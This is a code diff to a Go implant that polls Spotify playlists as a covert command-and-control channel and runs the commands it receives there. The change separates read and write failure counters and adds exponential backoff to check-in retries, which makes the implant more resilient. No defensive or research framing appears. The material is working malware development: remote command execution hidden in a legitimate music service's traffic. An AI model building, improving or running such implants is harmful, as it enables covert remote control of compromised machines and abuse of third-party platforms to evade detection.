@@ -22,15 +22,16 @@ import (
 
 // Implant polls for commands and executes them.
 type Implant struct {
-	client           *spotify.Client
-	key              string
-	interval         int
-	jitter           int
-	processedSeqs    map[int]bool
-	checkinPending   bool
-	consecutiveFails int
-	sessionID        string // unique per run, binds all commands
-	clientID         string
+	client            *spotify.Client
+	key               string
+	interval          int
+	jitter            int
+	processedSeqs     map[int]bool
+	checkinPending    bool
+	readFails         int // consecutive READ failures (polling)
+	writeFails        int // consecutive WRITE failures (checkin/results)
+	sessionID         string
+	clientID          string
 }
 
 // NewImplant creates a new implant.
@@ -244,24 +245,44 @@ func (imp *Implant) Run() {
 	fmt.Println("[*] Implant started, polling for commands...")
 	imp.sendCheckin()
 
+	writeBackoffUntil := time.Time{} // when to retry writes
+
 	for {
+		// Retry checkin if pending AND write backoff expired
+		if imp.checkinPending && time.Now().After(writeBackoffUntil) {
+			imp.sendCheckin()
+			if imp.checkinPending {
+				// Write failed again — exponential backoff for writes only
+				imp.writeFails++
+				backoff := 60 * (1 << (imp.writeFails - 1))
+				if backoff > 600 {
+					backoff = 600
+				}
+				writeBackoffUntil = time.Now().Add(
+					time.Duration(backoff) * time.Second)
+				if imp.writeFails <= 3 || imp.writeFails%10 == 0 {
+					fmt.Printf("[*] Write backoff: retry in %s (fail #%d)\n",
+						formatDuration(backoff), imp.writeFails)
+				}
+			} else {
+				imp.writeFails = 0
+			}
+		}
+
+		// Always poll for commands (READ) — independent of write state
 		imp.pollAndExecute()
 
-		// Calculate sleep: normal jitter + exponential backoff on failures
+		// Sleep with jitter (based on READ failures only)
 		sleepTime := imp.interval + rand.Intn(2*imp.jitter+1) - imp.jitter
-		if imp.consecutiveFails > 0 {
-			// Exponential backoff: 30s, 60s, 120s, 240s, 300s, then 600s
-			backoff := 30 * (1 << (imp.consecutiveFails - 1))
-			if imp.consecutiveFails > 5 {
-				backoff = 600 // 10min after sustained failures (likely hard block)
-			} else if backoff > 300 {
+		if imp.readFails > 0 {
+			backoff := 30 * (1 << (imp.readFails - 1))
+			if backoff > 300 {
 				backoff = 300
 			}
 			sleepTime = backoff
-			// Only log first 3 failures and every 10th after
-			if imp.consecutiveFails <= 3 || imp.consecutiveFails%10 == 0 {
-				fmt.Printf("[*] Backoff: next poll in %s (fail #%d)\n",
-					formatDuration(sleepTime), imp.consecutiveFails)
+			if imp.readFails <= 3 || imp.readFails%10 == 0 {
+				fmt.Printf("[*] Read backoff: next poll in %s (fail #%d)\n",
+					formatDuration(sleepTime), imp.readFails)
 			}
 		}
 		if sleepTime < 10 {
@@ -274,15 +295,10 @@ func (imp *Implant) Run() {
 func (imp *Implant) pollAndExecute() {
 	ctx := context.Background()
 
-	// Retry checkin if it failed earlier, but not if we're rate limited
-	if imp.checkinPending && imp.consecutiveFails == 0 {
-		imp.sendCheckin()
-	}
-
 	seqGroups, err := imp.client.ReadC2Playlists(ctx,
 		protocol.ChannelCmd, imp.key, -1)
 	if err != nil {
-		imp.consecutiveFails++
+		imp.readFails++
 		if isTokenExpired(err) {
 			fmt.Printf("[!] Token expired at %s: delete .cache-* and re-authenticate\n",
 				time.Now().Format("15:04:05"))
@@ -292,10 +308,10 @@ func (imp *Implant) pollAndExecute() {
 				fmt.Printf("[!] Rate limited at %s, server says wait %s\n",
 					time.Now().Format("15:04:05"), formatDuration(retryAfter))
 				time.Sleep(time.Duration(retryAfter) * time.Second)
-				imp.consecutiveFails = 0 // reset after honoring the wait
+				imp.readFails = 0 // reset after honoring the wait
 			} else {
 				// No Retry-After parsed — only log first occurrence
-				if imp.consecutiveFails <= 1 {
+				if imp.readFails <= 1 {
 					fmt.Printf("[!] Rate limited at %s, backing off\n",
 						time.Now().Format("15:04:05"))
 				}
@@ -306,7 +322,7 @@ func (imp *Implant) pollAndExecute() {
 		}
 		return
 	}
-	imp.consecutiveFails = 0 // reset on success
+	imp.readFails = 0 // reset on success
 
 	if len(seqGroups) == 0 {
 		return
